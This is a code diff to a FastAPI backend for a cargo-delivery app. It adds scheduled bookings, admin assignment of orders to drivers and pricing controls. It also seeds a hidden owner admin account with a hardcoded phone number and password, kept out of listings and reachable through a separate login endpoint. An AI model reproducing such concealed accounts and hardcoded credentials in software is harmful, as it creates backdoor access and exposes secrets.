@@ -173,6 +173,10 @@ class CreateOrderRequest(BaseModel):
     cargo_notes: Optional[str] = ""
     cargo_images: Optional[List[str]] = []  # base64
     scheduled_at: Optional[str] = None
+    booking_type: Optional[Literal["now", "scheduled", "date", "time"]] = "now"
+    scheduled_date: Optional[str] = None
+    scheduled_time: Optional[str] = None
+    customer_live_location: Optional[Location] = None
 
 
 # -------------------------------------------------------------------
@@ -356,6 +360,19 @@ async def send_otp(req: SendOtpRequest):
     if len(phone) < 10:
         raise HTTPException(status_code=400, detail="Invalid phone number")
 
+    # Block the hidden owner phone from OTP flow — it must only be used via the
+    # dedicated admin phone+password login.
+    hidden_admin = await db.admins.find_one({"hidden": True})
+    if hidden_admin:
+        candidates = {hidden_admin.get("phone")}
+        hp = hidden_admin.get("phone", "")
+        if hp.startswith("0"):
+            candidates.add("+964" + hp[1:])
+        if hp.startswith("+964"):
+            candidates.add("0" + hp[4:])
+        if phone in candidates or req.phone in candidates:
+            raise HTTPException(status_code=403, detail="هذا الرقم محجوز")
+
     # Generate code: random when Twilio is active, fixed mock otherwise.
     code = _generate_otp_code() if TWILIO_ENABLED else MOCK_OTP
 
@@ -462,6 +479,11 @@ async def get_me(current_user: dict = Depends(get_current_user)):
     return {"user": current_user}
 
 
+class AdminPhoneLoginRequest(BaseModel):
+    phone: str
+    password: str
+
+
 @api.post("/auth/admin/login")
 async def admin_login(req: AdminLoginRequest):
     admin = await db.admins.find_one({"username": req.username.lower()})
@@ -474,6 +496,35 @@ async def admin_login(req: AdminLoginRequest):
         "success": True,
         "token": token,
         "admin": {"id": admin["id"], "username": admin["username"], "user_type": "admin"},
+    }
+
+
+@api.post("/auth/admin/phone-login")
+async def admin_phone_login(req: AdminPhoneLoginRequest):
+    """Hidden owner admin login via phone + password from the mobile app."""
+    phone = req.phone.strip()
+    # accept both with and without country code variations
+    candidates = [phone]
+    if phone.startswith("0"):
+        candidates.append("+964" + phone[1:])
+    if phone.startswith("+964"):
+        candidates.append("0" + phone[4:])
+    admin = await db.admins.find_one({"phone": {"$in": candidates}})
+    if not admin:
+        raise HTTPException(status_code=401, detail="بيانات الدخول غير صحيحة")
+    if not bcrypt.checkpw(req.password.encode("utf-8"), admin["password_hash"].encode("utf-8")):
+        raise HTTPException(status_code=401, detail="بيانات الدخول غير صحيحة")
+    token = create_jwt(admin["id"], "admin")
+    return {
+        "success": True,
+        "token": token,
+        "user_type": "admin",
+        "admin": {
+            "id": admin["id"],
+            "username": admin.get("username", "owner"),
+            "phone": admin.get("phone"),
+            "user_type": "admin",
+        },
     }
 
 
@@ -600,6 +651,20 @@ async def create_order(req: CreateOrderRequest, current_user: dict = Depends(get
         "status": status,
         "status_history": [{"status": status, "at": now_utc().isoformat()}],
         "payment_method": "cash",
+        # Scheduling
+        "booking_type": req.booking_type or "now",
+        "scheduled_date": req.scheduled_date or None,
+        "scheduled_time": req.scheduled_time or None,
+        "scheduled_at": req.scheduled_at or None,
+        # Customer live location (for admin to see context)
+        "customer_live_location": (
+            req.customer_live_location.dict() if req.customer_live_location else None
+        ),
+        # Admin assignment
+        "assigned_driver_id": None,
+        "assigned_driver_name": None,
+        "assigned_at": None,
+        "assigned_by": None,
         "rating": None,
         "rating_comment": None,
         "created_at": now_utc().isoformat(),
@@ -615,23 +680,12 @@ async def create_order(req: CreateOrderRequest, current_user: dict = Depends(get
     # Increment user total orders
     await db.users.update_one({"id": current_user["id"]}, {"$inc": {"total_orders": 1}})
 
-    if requires_manual:
-        logger.info(
-            f"[MANUAL REVIEW] Order {order['order_number']} ({round(distance,1)}km) sent to admin for pricing approval"
-        )
-    # Push to online drivers (excluding manual-review since price isn't set)
+    # Push to ADMIN only - drivers no longer auto-receive. Admin must assign.
     if not requires_manual:
         try:
-            await sio.emit("new_order", {"order": order}, room="drivers")
+            await sio.emit("new_order", {"order": order}, room="admins")
         except Exception:
             pass
-        asyncio.create_task(
-            _broadcast_push_to_online_drivers(
-                "🚚 طلب جديد متاح",
-                f"{order.get('cargo_description') or 'طلب نقل'} • {int(order.get('final_price') or 0):,} د.ع",
-                {"type": "new_order", "order_id": order["id"]},
-            )
-        )
     return {"success": True, "order": order}
 
 
@@ -795,12 +849,20 @@ async def driver_update_location(
 
 @api.get("/driver/orders/available")
 async def driver_available_orders(current_user: dict = Depends(get_current_user)):
+    """Orders the admin has *assigned* to this driver and that he hasn't yet accepted."""
     _require_driver(current_user)
     if not current_user.get("is_online"):
         return {"orders": [], "count": 0}
     cursor = (
-        db.orders.find({"status": "pending", "driver_id": None}, {"_id": 0})
-        .sort("created_at", -1)
+        db.orders.find(
+            {
+                "status": "assigned",
+                "assigned_driver_id": current_user["id"],
+                "driver_id": None,
+            },
+            {"_id": 0},
+        )
+        .sort("assigned_at", -1)
         .limit(30)
     )
     orders = await cursor.to_list(length=30)
@@ -846,9 +908,14 @@ async def driver_accept_order(
     if not current_user.get("is_approved", False):
         raise HTTPException(status_code=403, detail="حساب السائق غير معتمد")
 
-    # Atomic claim: only succeed if order still pending and unassigned
+    # Atomic claim: only succeed if order assigned to this driver and not yet accepted
     result = await db.orders.find_one_and_update(
-        {"id": order_id, "status": "pending", "driver_id": None},
+        {
+            "id": order_id,
+            "status": "assigned",
+            "assigned_driver_id": current_user["id"],
+            "driver_id": None,
+        },
         {
             "$set": {
                 "driver_id": current_user["id"],
@@ -1250,6 +1317,44 @@ async def seed_admin():
         )
         logger.info("Default admin seeded (admin / naqal2026)")
 
+    # Seed hidden owner admin (mobile phone+password login).
+    # IMPORTANT: this user is stored in db.admins (not db.users) so it never
+    # appears in any customer/driver listing. It's looked up only via the
+    # phone+password admin login endpoint.
+    HIDDEN_PHONE = "07517300194"
+    HIDDEN_PASSWORD = "yassir00"
+    existing_hidden = await db.admins.find_one({"phone": HIDDEN_PHONE})
+    if not existing_hidden:
+        pw_hash = bcrypt.hashpw(HIDDEN_PASSWORD.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")
+        await db.admins.insert_one(
+            {
+                "id": make_id(),
+                "username": "owner",
+                "phone": HIDDEN_PHONE,
+                "password_hash": pw_hash,
+                "hidden": True,
+                "created_at": now_utc().isoformat(),
+            }
+        )
+        logger.info("Hidden owner admin seeded (phone-based)")
+
+    # Default pricing settings (mirror of PRICING dict in /api/app_settings)
+    settings = await db.app_settings.find_one({"_id": "pricing"})
+    if not settings:
+        await db.app_settings.insert_one(
+            {
+                "_id": "pricing",
+                "min_price": PRICING["min_price"],
+                "max_auto_price": PRICING["max_auto_price"],
+                "auto_cap_distance_km": PRICING["auto_cap_distance_km"],
+                "manual_review_distance_km": PRICING["manual_review_distance_km"],
+                "peak_multiplier": PRICING["peak_multiplier"],
+                "tiers": PRICING["tiers"],
+                "vehicle_multiplier": PRICING["vehicle_multiplier"],
+                "updated_at": now_utc().isoformat(),
+            }
+        )
+
     # Seed a demo driver
     driver = await db.users.find_one({"user_type": "driver"})
     if not driver:
@@ -1505,6 +1610,143 @@ async def admin_stats(current_user: dict = Depends(get_current_user)):
         "week": {"orders_completed": week_done, "revenue": rev_week},
         "series_7d": series,
     }
+
+
+class AssignDriverRequest(BaseModel):
+    driver_id: str
+
+
+class PriceOverrideRequest(BaseModel):
+    price: float
+
+
+@api.post("/admin/orders/{order_id}/assign-driver")
+async def admin_assign_driver(
+    order_id: str,
+    req: AssignDriverRequest,
+    current_user: dict = Depends(get_current_user),
+):
+    """Admin manually assigns an order to a specific driver."""
+    _require_admin(current_user)
+    order = await db.orders.find_one({"id": order_id})
+    if not order:
+        raise HTTPException(status_code=404, detail="Order not found")
+    if order.get("status") not in ("pending", "assigned"):
+        raise HTTPException(status_code=400, detail=f"Cannot assign order with status {order['status']}")
+    driver = await db.users.find_one({"id": req.driver_id, "user_type": "driver"})
+    if not driver:
+        raise HTTPException(status_code=404, detail="Driver not found")
+    if not driver.get("is_approved"):
+        raise HTTPException(status_code=400, detail="Driver is not approved")
+    now = now_utc().isoformat()
+    await db.orders.update_one(
+        {"id": order_id},
+        {
+            "$set": {
+                "status": "assigned",
+                "assigned_driver_id": driver["id"],
+                "assigned_driver_name": driver.get("name", ""),
+                "assigned_at": now,
+                "assigned_by": current_user.get("id"),
+                "updated_at": now,
+            },
+            "$push": {"status_history": {"status": "assigned", "at": now}},
+        },
+    )
+    updated = await db.orders.find_one({"id": order_id}, {"_id": 0})
+    # Push real-time to that driver + emit
+    try:
+        await _emit_to_user(driver["id"], "new_order", {"order": updated})
+        await _emit_to_order(order_id, "order_update", {"order_id": order_id, "order": updated})
+    except Exception:
+        pass
+    asyncio.create_task(
+        _send_push(
+            [driver["id"]],
+            "🚚 طلب جديد مُعيّن لك",
+            f"{updated.get('cargo_description') or 'طلب نقل'} • {int(updated.get('final_price') or 0):,} د.ع",
+            {"type": "assigned", "order_id": order_id},
+        )
+    )
+    return {"success": True, "order": updated}
+
+
+@api.post("/admin/orders/{order_id}/override-price")
+async def admin_override_price(
+    order_id: str,
+    req: PriceOverrideRequest,
+    current_user: dict = Depends(get_current_user),
+):
+    _require_admin(current_user)
+    if req.price < 1000:
+        raise HTTPException(status_code=400, detail="Price too low")
+    order = await db.orders.find_one({"id": order_id})
+    if not order:
+        raise HTTPException(status_code=404, detail="Order not found")
+    now = now_utc().isoformat()
+    await db.orders.update_one(
+        {"id": order_id},
+        {
+            "$set": {
+                "final_price": req.price,
+                "price_overridden_at": now,
+                "price_overridden_by": current_user.get("id"),
+                "updated_at": now,
+            }
+        },
+    )
+    updated = await db.orders.find_one({"id": order_id}, {"_id": 0})
+    try:
+        await _emit_to_order(order_id, "order_update", {"order_id": order_id, "order": updated})
+    except Exception:
+        pass
+    return {"success": True, "order": updated}
+
+
+@api.get("/admin/pricing-settings")
+async def get_pricing_settings(current_user: dict = Depends(get_current_user)):
+    _require_admin(current_user)
+    settings = await db.app_settings.find_one({"_id": "pricing"})
+    if settings:
+        settings.pop("_id", None)
+    return {"settings": settings or {}}
+
+
+class PricingSettingsRequest(BaseModel):
+    min_price: Optional[int] = None
+    max_auto_price: Optional[int] = None
+    auto_cap_distance_km: Optional[int] = None
+    manual_review_distance_km: Optional[int] = None
+    peak_multiplier: Optional[float] = None
+    vehicle_multiplier: Optional[dict] = None
+
+
+@api.put("/admin/pricing-settings")
+async def update_pricing_settings(
+    req: PricingSettingsRequest, current_user: dict = Depends(get_current_user)
+):
+    _require_admin(current_user)
+    set_fields: dict = {"updated_at": now_utc().isoformat()}
+    for k, v in req.dict(exclude_none=True).items():
+        set_fields[k] = v
+    if len(set_fields) == 1:
+        raise HTTPException(status_code=400, detail="No fields to update")
+    await db.app_settings.update_one({"_id": "pricing"}, {"$set": set_fields}, upsert=True)
+    # Apply to in-memory PRICING so new estimates use them immediately
+    if "min_price" in set_fields:
+        PRICING["min_price"] = int(set_fields["min_price"])
+    if "max_auto_price" in set_fields:
+        PRICING["max_auto_price"] = int(set_fields["max_auto_price"])
+    if "auto_cap_distance_km" in set_fields:
+        PRICING["auto_cap_distance_km"] = int(set_fields["auto_cap_distance_km"])
+    if "manual_review_distance_km" in set_fields:
+        PRICING["manual_review_distance_km"] = int(set_fields["manual_review_distance_km"])
+    if "peak_multiplier" in set_fields:
+        PRICING["peak_multiplier"] = float(set_fields["peak_multiplier"])
+    if "vehicle_multiplier" in set_fields and isinstance(set_fields["vehicle_multiplier"], dict):
+        PRICING["vehicle_multiplier"].update(set_fields["vehicle_multiplier"])
+    settings = await db.app_settings.find_one({"_id": "pricing"}, {"_id": 0})
+    return {"success": True, "settings": settings}
 
 
 @api.get("/admin/support/tickets")
